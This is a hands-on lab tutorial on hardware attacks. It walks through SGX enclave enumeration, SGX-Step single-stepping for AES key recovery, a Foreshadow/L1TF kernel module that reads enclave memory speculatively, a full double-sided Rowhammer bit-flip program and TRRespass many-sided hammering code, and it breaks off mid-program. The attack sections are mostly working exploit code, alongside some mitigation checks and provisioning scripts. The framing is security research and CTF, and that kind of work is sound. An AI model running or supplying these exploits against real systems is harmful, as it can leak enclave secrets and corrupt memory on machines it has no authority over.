# Tutorial: SGX Security, Rowhammer, and Hardware Vulnerability Exploitation — Hands-On Lab

> **Source document:** domain7_chapter7B_sgx_rowhammer_hw.md  
> **Prerequisites:** Chapter 7A tutorial (speculative execution, cache side channels, timing primitives)  
> **Scope:** Intel SGX enclave attacks, Rowhammer exploitation, DMA attacks, TPM attacks, hardware vulnerability detection and hardening  
> **Authorization context:** Ethical security research, CTF, authorized penetration testing only

---

## Lab Environment Setup

### Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                        PHYSICAL HOST                                 │
│  CPU: Intel Xeon with SGX (Ice Lake / Sapphire Rapids)              │
│  RAM: DDR4 non-ECC (for Rowhammer testing)                          │
│  Optional: DDR4 ECC (for ECCploit testing)                          │
│  Thunderbolt port (for DMA attack testing)                          │
│  TPM 2.0 (discrete or fTPM)                                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌────────────────────┐  ┌─────────────────────┐                   │
│  │  VM: sgx-attack    │  │  VM: rowhammer-lab  │                   │
│  │  Ubuntu 22.04      │  │  Ubuntu 22.04       │                   │
│  │  Intel SGX SDK     │  │  Huge pages enabled │                   │
│  │  SGX-Step          │  │  TRRespass/Blacksmith│                   │
│  │  Gramine           │  │  DRAMA tools        │                   │
│  │  4 vCPU, 8 GB RAM  │  │  4 vCPU, 16 GB RAM  │                   │
│  └────────────────────┘  └─────────────────────┘                   │
│                                                                     │
│  ┌────────────────────┐  ┌─────────────────────┐                   │
│  │  VM: hw-detect     │  │  VM: dma-target     │                   │
│  │  Ubuntu 22.04      │  │  Ubuntu 22.04       │                   │
│  │  EDAC monitoring   │  │  IOMMU testing      │                   │
│  │  perf tools        │  │  Thunderbolt config │                   │
│  │  rasdaemon         │  │  bolt daemon        │                   │
│  │  2 vCPU, 4 GB RAM  │  │  2 vCPU, 4 GB RAM   │                   │
│  └────────────────────┘  └─────────────────────┘                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### VM Provisioning Script

```bash
#!/bin/bash
# lab_provision.sh — Deploy hardware security lab VMs
# Run on host with KVM/QEMU or Proxmox
# IMPORTANT: SGX exercises require bare-metal or SGX-passthrough-capable hypervisor
# Rowhammer exercises require bare-metal for real DRAM testing

set -euo pipefail

LAB_BASE="/opt/hw-security-lab"
ISO_URL="https://releases.ubuntu.com/22.04/ubuntu-22.04.4-live-server-amd64.iso"

mkdir -p "$LAB_BASE"/{isos,images,scripts}

# Download base ISO if not present
[ -f "$LAB_BASE/isos/ubuntu-22.04.iso" ] || \
    wget -O "$LAB_BASE/isos/ubuntu-22.04.iso" "$ISO_URL"

# Function: create and provision a VM
create_vm() {
    local NAME="$1" MEMORY="$2" CPUS="$3" DISK="$4"
    local IMG="$LAB_BASE/images/${NAME}.qcow2"
    
    [ -f "$IMG" ] && { echo "[*] $NAME already exists"; return; }
    
    qemu-img create -f qcow2 "$IMG" "${DISK}G"
    
    echo "[+] Created $NAME: ${CPUS} vCPU, ${MEMORY} MB RAM, ${DISK} GB disk"
}

create_vm "sgx-attack"    8192 4 60
create_vm "rowhammer-lab" 16384 4 40
create_vm "hw-detect"     4096 2 30
create_vm "dma-target"    4096 2 30

cat > "$LAB_BASE/scripts/provision_common.sh" << 'PROVISION'
#!/bin/bash
# Common provisioning for all VMs
export DEBIAN_FRONTEND=noninteractive

apt-get update && apt-get upgrade -y
apt-get install -y \
    build-essential gcc g++ make cmake git \
    linux-headers-$(uname -r) linux-tools-$(uname -r) \
    python3 python3-pip python3-venv \
    nasm gdb strace ltrace \
    libssl-dev libelf-dev \
    cpuid msr-tools hwinfo dmidecode \
    jq bc xxd wget curl \
    net-tools iproute2

pip3 install --break-system-packages numpy scipy pycryptodome
PROVISION

cat > "$LAB_BASE/scripts/provision_sgx.sh" << 'SGX_PROV'
#!/bin/bash
# SGX-Attack VM provisioning
export DEBIAN_FRONTEND=noninteractive

# Intel SGX SDK and PSW
echo 'deb [arch=amd64 signed-by=/usr/share/keyrings/intel-sgx-keyring.gpg] https://download.01.org/intel-sgx/sgx_repo/ubuntu jammy main' \
    | tee /etc/apt/sources.list.d/intel-sgx.list
wget -qO- https://download.01.org/intel-sgx/sgx_repo/ubuntu/intel-sgx-deb.key \
    | gpg --dearmor -o /usr/share/keyrings/intel-sgx-keyring.gpg
apt-get update
apt-get install -y \
    libsgx-epid libsgx-quote-ex libsgx-dcap-ql \
    sgx-aesm-service libsgx-urts \
    libsgx-dcap-default-qpl libsgx-dcap-ql-dev \
    libsgx-enclave-common-dev

# SGX SDK
SGXSDK_URL="https://download.01.org/intel-sgx/sgx-linux/2.23/distro/ubuntu22.04-server/sgx_linux_x64_sdk_2.23.100.2.bin"
wget -O /tmp/sgx_sdk.bin "$SGXSDK_URL"
chmod +x /tmp/sgx_sdk.bin
echo "yes" | /tmp/sgx_sdk.bin --prefix=/opt/intel
echo 'source /opt/intel/sgxsdk/environment' >> /etc/profile.d/sgx.sh

# SGX-Step
cd /opt
git clone https://github.com/jovanbulck/sgx-step
cd sgx-step && make -C kernel && make -C libsgxstep

# Gramine
apt-get install -y gramine

# SGX capability verification tool
cat > /usr/local/bin/sgx_check.sh << 'EOF'
#!/bin/bash
echo "=== SGX Capability Check ==="
cpuid | grep -i sgx | head -20
echo ""
echo "=== SGX Devices ==="
ls -la /dev/sgx* 2>/dev/null || echo "No SGX devices found"
echo ""
echo "=== AESM Service ==="
systemctl status aesmd --no-pager 2>/dev/null || echo "AESM not running"
echo ""
echo "=== SGX EPC Size ==="
dmesg | grep -i "sgx.*epc" 2>/dev/null
EOF
chmod +x /usr/local/bin/sgx_check.sh
SGX_PROV

cat > "$LAB_BASE/scripts/provision_rowhammer.sh" << 'RH_PROV'
#!/bin/bash
# Rowhammer Lab VM provisioning
export DEBIAN_FRONTEND=noninteractive

# Enable huge pages
echo 'vm.nr_hugepages=512' >> /etc/sysctl.d/99-rowhammer.conf
sysctl -p /etc/sysctl.d/99-rowhammer.conf
mkdir -p /mnt/huge
echo 'hugetlbfs /mnt/huge hugetlbfs defaults 0 0' >> /etc/fstab
mount -a 2>/dev/null || true

# Google rowhammer-test
cd /opt
git clone https://github.com/google/rowhammer-test || true
cd rowhammer-test && make 2>/dev/null || true

# TRRespass
cd /opt
git clone https://github.com/vusec/trrespass || true

# Blacksmith
cd /opt
git clone https://github.com/comsec-group/blacksmith || true
cd blacksmith && mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release 2>/dev/null
make -j$(nproc) 2>/dev/null || true

# DRAMA timing tool
cat > /opt/drama_bank_detect.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>

#define HUGE_SIZE (2 * 1024 * 1024)
#define NUM_PAGES 32
#define SAMPLES 1000
#define CONFLICT_THRESHOLD 300

static inline uint64_t rdtsc(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void clflush(volatile void *p) {
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

uint64_t time_access_pair(volatile char *a, volatile char *b) {
    uint64_t total = 0;
    for (int s = 0; s < SAMPLES; s++) {
        clflush(a);
        clflush(b);
        asm volatile("mfence");
        uint64_t t0 = rdtsc();
        *(volatile char *)a;
        *(volatile char *)b;
        uint64_t t1 = rdtsc();
        total += (t1 - t0);
    }
    return total / SAMPLES;
}

int main(void) {
    size_t total = (size_t)NUM_PAGES * HUGE_SIZE;
    char *mem = mmap(NULL, total, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap (need huge pages: echo 512 > /proc/sys/vm/nr_hugepages)");
        return 1;
    }
    memset(mem, 0, total);

    printf("=== DRAMA Bank Detection ===\n");
    printf("Testing %d addresses for row-buffer conflicts...\n\n", NUM_PAGES);
    
    int bank_groups[NUM_PAGES];
    int current_group = 0;
    memset(bank_groups, -1, sizeof(bank_groups));

    for (int i = 0; i < NUM_PAGES; i++) {
        if (bank_groups[i] != -1) continue;
        bank_groups[i] = current_group;
        volatile char *addr_i = (volatile char *)(mem + i * HUGE_SIZE + 64);
        
        for (int j = i + 1; j < NUM_PAGES; j++) {
            if (bank_groups[j] != -1) continue;
            volatile char *addr_j = (volatile char *)(mem + j * HUGE_SIZE + 64);
            uint64_t lat = time_access_pair(addr_i, addr_j);
            if (lat > CONFLICT_THRESHOLD) {
                bank_groups[j] = current_group;
            }
        }
        current_group++;
    }

    printf("Bank grouping results:\n");
    for (int g = 0; g < current_group; g++) {
        printf("  Bank group %d: ", g);
        for (int i = 0; i < NUM_PAGES; i++) {
            if (bank_groups[i] == g)
                printf("page_%d ", i);
        }
        printf("\n");
    }

    munmap(mem, total);
    return 0;
}
EOF
gcc -O2 -o /opt/drama_bank_detect /opt/drama_bank_detect.c

echo "[+] Rowhammer lab provisioned"
RH_PROV

cat > "$LAB_BASE/scripts/provision_detect.sh" << 'DET_PROV'
#!/bin/bash
# Hardware Detection VM provisioning
export DEBIAN_FRONTEND=noninteractive

apt-get install -y \
    rasdaemon mcelog \
    linux-tools-generic \
    tpm2-tools \
    bolt \
    edac-utils

# Enable rasdaemon
systemctl enable --now rasdaemon 2>/dev/null || true

# Performance monitoring scripts directory
mkdir -p /opt/hw-detection/scripts

# Microcode and vulnerability check script
cat > /opt/hw-detection/scripts/vuln_audit.sh << 'EOF'
#!/bin/bash
echo "=== CPU Vulnerability Mitigation Status ==="
echo "Microcode: $(grep -m1 'microcode' /proc/cpuinfo | awk '{print $NF}')"
echo ""
for f in /sys/devices/system/cpu/vulnerabilities/*; do
    printf "%-30s %s\n" "$(basename $f):" "$(cat $f)"
done
echo ""
echo "=== SMT Status ==="
cat /sys/devices/system/cpu/smt/active 2>/dev/null && echo " (SMT active)" || echo "N/A"
echo ""
echo "=== IOMMU Status ==="
dmesg | grep -i "iommu\|dmar\|amd-vi" | tail -5
grep -oP '(intel_iommu|iommu|amd_iommu)=[^ ]+' /proc/cmdline 2>/dev/null
echo ""
echo "=== KSM Status ==="
echo "Running: $(cat /sys/kernel/mm/ksm/run 2>/dev/null || echo N/A)"
echo "Pages shared: $(cat /sys/kernel/mm/ksm/pages_shared 2>/dev/null || echo N/A)"
echo ""
echo "=== Transparent Huge Pages ==="
cat /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || echo "N/A"
echo ""
echo "=== EDAC Memory Controller ==="
ls /sys/devices/system/edac/mc/ 2>/dev/null && \
    for mc in /sys/devices/system/edac/mc/mc*/; do
        echo "  $(basename $mc): CE=$(cat ${mc}ce_count 2>/dev/null) UE=$(cat ${mc}ue_count 2>/dev/null)"
    done || echo "No EDAC controller detected"
echo ""
echo "=== RAPL Access ==="
ls -la /sys/class/powercap/intel-rapl:0/energy_uj 2>/dev/null
cat /proc/sys/kernel/perf_event_paranoid
echo ""
echo "=== TPM ==="
tpm2_getcap properties-fixed 2>/dev/null | head -10 || echo "No TPM detected"
EOF
chmod +x /opt/hw-detection/scripts/vuln_audit.sh
DET_PROV

chmod +x "$LAB_BASE/scripts/"*.sh
echo "[+] Lab environment configured at $LAB_BASE"
echo "[!] NOTE: SGX and Rowhammer exercises require bare-metal execution for real results"
echo "[!]       VMs can be used for tool familiarization and code compilation only"
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: SGX Enclave Enumeration and Capability Assessment

**Objective:** Identify SGX-capable platforms, enumerate running enclaves, assess EPC configuration, and determine the attack surface.

**Step 1: SGX hardware detection**

```bash
# Check CPUID for SGX support
cpuid | grep -A5 -i "sgx"
# Key fields:
#   SGX1 supported = yes → basic enclave support
#   SGX2 supported = yes → dynamic page management (EAUG/EMODT)
#   Maximum enclave size (64-bit) → EPC upper bound

# Check SGX-specific CPUID leaf (leaf 0x12)
cpuid -l 0x12 -s 0
# EAX bit 0: SGX1; EAX bit 1: SGX2
# EAX bit 5: ENCLS[ETRACK] supported
# EAX bit 6: ENCLS[ETRACKC] supported (SGX2)

cpuid -l 0x12 -s 1
# Reports MISCSELECT and attributes flags

cpuid -l 0x12 -s 2
# Reports EPC section: base physical address and size
# Example: EPC base=0x80000000, size=128 MB
```

**Step 2: EPC and enclave enumeration**

```bash
# Check EPC regions from dmesg
dmesg | grep -i "sgx\|epc" | grep -v "audit"
# Expected: "sgx: EPC section 0x800000000-0x807ffffff"

# SGX device nodes
ls -la /dev/sgx_enclave /dev/sgx_provision 2>/dev/null
# /dev/sgx_enclave: used by ECREATE/EADD/EINIT
# /dev/sgx_provision: used by attestation key provisioning

# Find running enclaves
grep -l sgx /proc/*/maps 2>/dev/null | while read f; do
    PID=$(echo "$f" | cut -d/ -f3)
    echo "PID $PID ($(cat /proc/$PID/comm 2>/dev/null)):"
    grep sgx "/proc/$PID/maps" 2>/dev/null | head -5
done

# AESM service (Architectural Enclave Service Manager)
systemctl status aesmd --no-pager
# AESM manages: Launch Enclave, Quoting Enclave, Provisioning Enclave
```

**Step 3: EPC memory pressure analysis**

```bash
# Monitor EPC page usage (requires SGX driver sysfs)
cat /sys/devices/system/node/node0/sgx/nr_total_epc_pages 2>/dev/null
cat /sys/devices/system/node/node0/sgx/nr_free_epc_pages 2>/dev/null

# On multi-NUMA systems, check per-node EPC allocation
for node in /sys/devices/system/node/node*/sgx/; do
    echo "$(dirname $node | xargs basename): total=$(cat ${node}nr_total_epc_pages 2>/dev/null) free=$(cat ${node}nr_free_epc_pages 2>/dev/null)"
done
```

**Expected output:** Platform SGX capabilities identified, running enclaves listed, EPC size and allocation observed.

---

### Exercise 2: SGX-Step Controlled-Channel Attack (Single-Instruction Stepping)

**Objective:** Use SGX-Step to single-step an enclave, recording per-instruction page accesses and RIP values to extract the enclave's execution trace.

**Step 1: Build SGX-Step framework**

```bash
cd /opt/sgx-step

# Build kernel module
cd kernel
make clean && make
sudo insmod sgx-step-mod.ko
dmesg | tail -5  # Verify: "sgx-step: loaded"

# Build user-space library
cd ../libsgxstep
make clean && make

# Verify APIC timer access
cat /proc/interrupts | grep -i "local timer\|apic"
```

**Step 2: Build a vulnerable enclave target**

```c
// target_enclave/enclave.c — T-Table AES (deliberately vulnerable)
// This enclave uses lookup-table AES, leaking access patterns

#include <sgx_trts.h>
#include <string.h>

// Simplified T-Table AES (4 tables, 256 entries each)
// In production: NEVER use T-Table AES in SGX — use AES-NI
static const uint32_t Te0[256] = { /* ... standard AES T-table ... */ };
static const uint32_t Te1[256] = { /* ... */ };
static const uint32_t Te2[256] = { /* ... */ };
static const uint32_t Te3[256] = { /* ... */ };

static uint8_t aes_key[16] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
};

void ecall_encrypt(uint8_t *plaintext, uint8_t *ciphertext) {
    uint32_t state[4];
    
    // Initial AddRoundKey (leaks key XOR plaintext via T-table index)
    state[0] = Te0[plaintext[0] ^ aes_key[0]] ^
               Te1[plaintext[1] ^ aes_key[1]] ^
               Te2[plaintext[2] ^ aes_key[2]] ^
               Te3[plaintext[3] ^ aes_key[3]];
    // ... remaining rounds ...
    
    memcpy(ciphertext, state, 16);
}
```

**Step 3: Configure and execute SGX-Step single-stepping**

```bash
# Build the attack application
cd /opt/sgx-step/app

# Edit Makefile to point to target enclave
# The attack framework:
# 1. Loads the target enclave
# 2. Configures APIC timer for single-instruction interrupt
# 3. Calls EENTER
# 4. On each AEX:
#    - Reads GPRSGX.RIP from SSA → instruction address
#    - Probes cache state (PRIME+PROBE or FLUSH+RELOAD)
#    - Logs (RIP, cache_set_activity)
# 5. Calls ERESUME
# 6. Repeats until enclave returns

make clean && make
sudo ./attacker --enclave ../target_enclave/enclave.signed.so \
    --function ecall_encrypt \
    --trace-file /tmp/sgxstep_trace.csv

# Output format: timestamp, RIP, page_accessed, cache_sets_active
```

**Step 4: Analyze the trace**

```python
#!/usr/bin/env python3
"""analyze_sgxstep_trace.py — Extract T-Table indices from SGX-Step trace"""
import csv
import numpy as np
from collections import defaultdict

# T-Table pages (4 tables × 1 KB each = 4 pages in a typical layout)
TTABLE_BASE = 0x7f000  # Enclave-relative base of T-tables
TTABLE_SIZE = 256 * 4  # 1024 bytes per table
PAGE_SIZE = 4096

def page_to_table_index(page_addr, ttable_base):
    """Convert accessed page to T-Table table number"""
    offset = page_addr - ttable_base
    if 0 <= offset < 4 * TTABLE_SIZE:
        return offset // TTABLE_SIZE
    return -1

# Parse SGX-Step trace
accesses = defaultdict(list)
with open('/tmp/sgxstep_trace.csv') as f:
    reader = csv.DictReader(f)
    for row in reader:
        rip = int(row['rip'], 16)
        page = int(row['page_accessed'], 16)
        cache_sets = row['cache_sets']
        
        table_idx = page_to_table_index(page, TTABLE_BASE)
        if table_idx >= 0:
            # Cache-line granularity reveals table index (mod 16)
            # Each cache line = 64 bytes = 16 table entries
            cache_line_offset = int(cache_sets.split(',')[0]) if cache_sets else 0
            accesses[table_idx].append(cache_line_offset)

print("[*] T-Table access pattern recovered:")
for table, indices in sorted(accesses.items()):
    print(f"  Table Te{table}: {len(indices)} accesses, "
          f"cache lines: {sorted(set(indices))[:10]}...")
    # Each cache line narrows the key byte to 16 candidates
    # Multiple encryptions with known plaintext → full key recovery
```

**Verification:** The trace reveals which T-Table cache lines were accessed per AES round, reducing the key-byte search space from 256 to 16 candidates per encryption. With ~1000 traces and known plaintexts, full 128-bit key recovery is achievable.

---

### Exercise 3: Foreshadow/L1TF Attack Against SGX Enclave

**Objective:** Demonstrate the L1TF (CVE-2018-3615) attack against SGX by reading decrypted enclave data from L1D via speculative execution through non-present PTEs.

**Step 1: Prepare the attack (requires kernel module for PTE manipulation)**

```c
// l1tf_sgx_attack.c — Kernel module for Foreshadow/L1TF against SGX
// EDUCATIONAL ONLY — requires unpatched system (pre-August 2018 microcode)
// On patched systems, L1D is flushed on enclave exit, blocking this attack

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/pgtable.h>

// The attack:
// 1. Enclave executes, bringing secret data into L1D (decrypted)
// 2. Attacker sets PTE for enclave page: Present=0, PFN preserved
// 3. Speculative load through non-present PTE reads from L1D
// 4. Transient execution encodes data into cache (FLUSH+RELOAD oracle)

#define PROBE_ARRAY_SIZE (256 * 4096)
static char *probe_array;

// Set PTE present bit to 0 while preserving physical address
static int clear_pte_present(unsigned long vaddr) {
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    
    pgd = pgd_offset(current->mm, vaddr);
    if (pgd_none(*pgd)) return -1;
    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d)) return -1;
    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud)) return -1;
    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd)) return -1;
    pte = pte_offset_kernel(pmd, vaddr);
    
    // Clear present bit — speculative load will still use PFN field
    *pte = pte_clear_flags(*pte, _PAGE_PRESENT);
    // Flush TLB for this address
    asm volatile("invlpg (%0)" :: "r"(vaddr) : "memory");
    
    return 0;
}

// Speculative read through non-present PTE + cache encoding
static uint8_t l1tf_read_byte(unsigned long target_vaddr) {
    volatile char *probe = probe_array;
    uint8_t results[256] = {0};
    int best_idx = 0, best_count = 0;
    
    for (int trial = 0; trial < 1000; trial++) {
        // Flush probe array from cache
        for (int i = 0; i < 256; i++)
            asm volatile("clflush (%0)" :: "r"(probe + i * 4096));
        asm volatile("mfence");
        
        // Speculative load: faults architecturally, reads L1D speculatively
        asm volatile(
            "xor %%rax, %%rax\n"
            "1:\n"
            "movzbl (%[target]), %%eax\n"     // Faults (P=0), speculative L1D read
            "shl $12, %%rax\n"
            "movq (%[probe], %%rax), %%rbx\n" // Encode into cache
            ".byte 0x0f, 0x0b\n"              // ud2 — never reached
            "2:\n"
            :
            : [target] "r" (target_vaddr),
              [probe] "r" (probe)
            : "rax", "rbx", "memory"
        );
        
        // Handle the page fault (suppressed via signal handler or TSX)
        
        // Probe cache: which line is now cached?
        for (int i = 0; i < 256; i++) {
            uint64_t t0, t1;
            asm volatile("rdtscp" : "=a"(t0) :: "rcx", "rdx");
            volatile char tmp = probe[i * 4096];
            asm volatile("rdtscp" : "=a"(t1) :: "rcx", "rdx");
            (void)tmp;
            if ((t1 - t0) < 80) results[i]++;
        }
    }
    
    for (int i = 0; i < 256; i++) {
        if (results[i] > best_count) {
            best_count = results[i];
            best_idx = i;
        }
    }
    return (uint8_t)best_idx;
}
```

**Step 2: Verify mitigation status**

```bash
# Check if L1TF mitigation is active (blocks the attack)
cat /sys/devices/system/cpu/vulnerabilities/l1tf
# Expected on patched: "Mitigation: PTE Inversion; VMX: conditional cache flushes..."
# If "Vulnerable" — attack is viable (research-only systems)

# Check L1D flush on enclave exit
dmesg | grep -i "l1d\|l1tf"
# Look for: "L1TF SGX: Mitigation: Flush L1D on enclave exit"

# PTE Inversion status (prevents valid physical address in non-present PTEs)
dmesg | grep "PTE Inversion"
```

**Step 3: Understanding the mitigation**

```bash
# The L1D flush occurs via MSR write on every enclave exit:
# wrmsr(MSR_IA32_FLUSH_CMD, L1D_FLUSH)
# This clears ALL L1D contents before returning to untrusted code

# On pre-mitigation systems, the attack window is:
# 1. Enclave loads secret into L1D (decrypted)
# 2. AEX occurs (interrupt, page fault)
# 3. Attacker code runs BEFORE L1D flush
# 4. Speculative load reads decrypted secret from L1D

# On mitigated systems:
# 1. Enclave loads secret into L1D
# 2. AEX occurs → kernel flushes L1D
# 3. Attacker code runs → L1D is empty → nothing to leak
```

**Verification:** On patched systems, the attack fails (L1D is flushed). On unpatched systems (research lab only), the attack reads arbitrary enclave memory at 64 bytes per attempt.

---

### Exercise 4: Double-Sided Rowhammer with Huge Pages

**Objective:** Induce bit flips in DRAM by hammering aggressor rows adjacent to a victim row, using huge pages for physical contiguity.

**Step 1: Environment preparation**

```bash
# Allocate huge pages (2 MB each)
echo 512 | sudo tee /proc/sys/vm/nr_hugepages
cat /proc/meminfo | grep -i huge
# HugePages_Total:     512
# HugePages_Free:      512
# Hugepagesize:      2048 kB

# Verify DRAM configuration
sudo dmidecode -t memory | grep -E 'Type:|Speed:|Size:|Manufacturer:|Error Correction'
# For this exercise: non-ECC DDR4 preferred (ECC silently corrects single-bit flips)

# Check if clflush is available (required for efficient hammering)
grep -o 'clflush' /proc/cpuinfo | head -1
```

**Step 2: Build and run the double-sided hammer**

```c
// double_sided_hammer.c
// gcc -O2 -o hammer double_sided_hammer.c -lrt
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#define ROW_SIZE       8192    // Typical DRAM row: 8 KB
#define HUGE_PAGE_SIZE (2UL * 1024 * 1024)
#define NUM_HUGE_PAGES 64
#define HAMMER_ITERS   3000000 // ~150 ms at 50 ns/tRC (covers 2+ refresh intervals)
#define FILL_PATTERN   0xFF    // All-ones pattern (1→0 flips are most common)

static inline void clflush(volatile void *p) {
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

static inline void mfence(void) {
    asm volatile("mfence" ::: "memory");
}

static inline uint64_t rdtsc(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

void hammer_double(volatile char *a, volatile char *b, int n) {
    for (int i = 0; i < n; i++) {
        *(volatile char *)a;
        *(volatile char *)b;
        clflush(a);
        clflush(b);
        mfence();
    }
}

int main(int argc, char *argv[]) {
    int iterations = argc > 1 ? atoi(argv[1]) : HAMMER_ITERS;
    size_t total = (size_t)NUM_HUGE_PAGES * HUGE_PAGE_SIZE;
    
    printf("[*] Rowhammer Lab: Double-Sided Hammering\n");
    printf("[*] Allocating %zu MB of huge pages...\n", total / (1024*1024));
    
    char *mem = mmap(NULL, total, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap (ensure huge pages: echo 512 > /proc/sys/vm/nr_hugepages)");
        return 1;
    }
    
    // Fill with known pattern
    memset(mem, FILL_PATTERN, total);
    printf("[*] Memory filled with 0x%02X\n", FILL_PATTERN);
    printf("[*] Hammering with %d iterations per pair (~%.1f ms)\n",
           iterations, iterations * 50e-9 * 1000);
    
    int total_flips = 0;
    int pairs_tested = 0;
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    for (size_t hp = 0; hp < total; hp += HUGE_PAGE_SIZE) {
        // Within each huge page, test row triplets
        for (size_t off = 0; off + 3 * ROW_SIZE <= HUGE_PAGE_SIZE; off += ROW_SIZE) {
            volatile char *aggressor_a = (volatile char *)(mem + hp + off);
            volatile char *victim      = (volatile char *)(mem + hp + off + ROW_SIZE);
            volatile char *aggressor_b = (volatile char *)(mem + hp + off + 2 * ROW_SIZE);
            
            pairs_tested++;
            hammer_double(aggressor_a, aggressor_b, iterations);
            
            // Check victim row for bit flips
            for (size_t b = 0; b < ROW_SIZE; b++) {
                uint8_t expected = FILL_PATTERN;
                uint8_t actual = ((volatile uint8_t *)victim)[b];
                if (actual != expected) {
                    uint8_t flipped_bits = actual ^ expected;
                    printf("[!] FLIP at offset 0x%lx: expected=0x%02X got=0x%02X "
                           "flipped_bits=0b",
                           (unsigned long)(hp + off + ROW_SIZE + b),
                           expected, actual);
                    for (int bit = 7; bit >= 0; bit--)
                        printf("%d", (flipped_bits >> bit) & 1);
                    printf(" (bit positions: ");
                    for (int bit = 0; bit < 8; bit++)
                        if (flipped_bits & (1 << bit)) printf("%d ", bit);
                    printf(")\n");
                    total_flips++;
                }
            }
            
            // Reset victim row
            memset((void *)victim, FILL_PATTERN, ROW_SIZE);
            
            if (pairs_tested % 100 == 0) {
                printf("[*] Progress: %d pairs tested, %d flips found\n",
                       pairs_tested, total_flips);
            }
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    
    printf("\n[*] === RESULTS ===\n");
    printf("[*] Pairs tested: %d\n", pairs_tested);
    printf("[*] Total bit flips: %d\n", total_flips);
    printf("[*] Elapsed time: %.1f seconds\n", elapsed);
    printf("[*] Flip rate: %.4f flips/pair\n",
           pairs_tested > 0 ? (double)total_flips / pairs_tested : 0);
    
    munmap(mem, total);
    return total_flips > 0 ? 0 : 1;
}
```

**Step 3: Compile and execute**

```bash
gcc -O2 -o hammer double_sided_hammer.c -lrt
sudo ./hammer 3000000
# Requires root for huge page access
# Expected: bit flips within 5-30 minutes on vulnerable DDR4
# On DDR5 or TRR-protected DDR4: may require TRRespass patterns (Exercise 5)
```

**Step 4: Analyze flip patterns**

```bash
# Run with different fill patterns to characterize directional vulnerability
sudo ./hammer 3000000  # 0xFF fill → detects 1→0 flips
# Modify FILL_PATTERN to 0x00 → detects 0→1 flips
# Modify FILL_PATTERN to 0xAA → detects both directions
```

**Expected output:** Bit flip locations, directions (1→0 vs 0→1), and positional patterns that indicate DRAM cell weakness.

---

### Exercise 5: TRRespass — Many-Sided Hammering to Bypass TRR

**Objective:** Bypass Target Row Refresh (TRR) using many-sided aggressor patterns that exhaust TRR's limited counter capacity.

**Step 1: Build the many-sided hammer**

```c
// trrespass_hammer.c — TRR bypass via counter exhaustion
// gcc -O2 -o trrespass trrespass_hammer.c -lrt
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>

#define ROW_SIZE       8192
#define HUGE_PAGE_SIZE (2UL * 1024 * 1024)
#define NUM_HUGE_PAGES 128
#define FILL_PATTERN   0x55

static inline void clflush(volatile void *p) {
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

// Many-sided hammer: cycle through N aggressors
// Each individual aggressor stays below TRR detection threshold
// Cumulative disturbance on victim exceeds flip threshold
void hammer_many_sided(volatile char **aggressors, int n_agg,
                       int total_activations) {
    int iters = total_activations / n_agg;
    for (int r = 0; r < iters; r++) {
        // Access all aggressors
        for (int a = 0; a < n_agg; a++)
            *(volatile char *)aggressors[a];
        // Flush all from cache
        for (int a = 0; a < n_agg; a++)
            asm volatile("clflush (%0)" :: "r"(aggressors[a]));
        asm volatile("mfence");
    }
}

// Non-uniform frequency variant (Blacksmith-style)
// Some aggressors hammered more frequently than others
void hammer_nonuniform(volatile char **aggressors, int n_agg,
                       int *weights, int total_activations) {
    int total_weight = 0;
    for (int a = 0; a < n_agg; a++) total_weight += weights[a];
    
    int iters = total_activations / total_weight;
    for (int r = 0; r < iters; r++) {
        for (int a = 0; a < n_agg; a++) {
            for (int w = 0; w < weights[a]; w++) {
                *(volatile char *)aggressors[a];
                asm volatile("clflush (%0)" :: "r"(aggressors[a]));
            }
        }
        asm volatile("mfence");
    }
}

int main(void) {
    size_t total = (size_t)NUM_HUGE_PAGES * HUGE_PAGE_SIZE;
    char *mem = mmap(NULL, total, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return 1; }
    memset(mem, FILL_PATTERN, total);
    
    printf("[*] TRRespass: Many-Sided Rowhammer\n");
    printf("[*] Testing aggressor counts: 4, 8, 12, 16, 19, 24\n\n");
    
    int test_counts[] = {4, 8, 12, 16, 19, 24};
    int n_tests = sizeof(test_counts) / sizeof(test_counts[0]);
    int total_activations = 5000000;
    
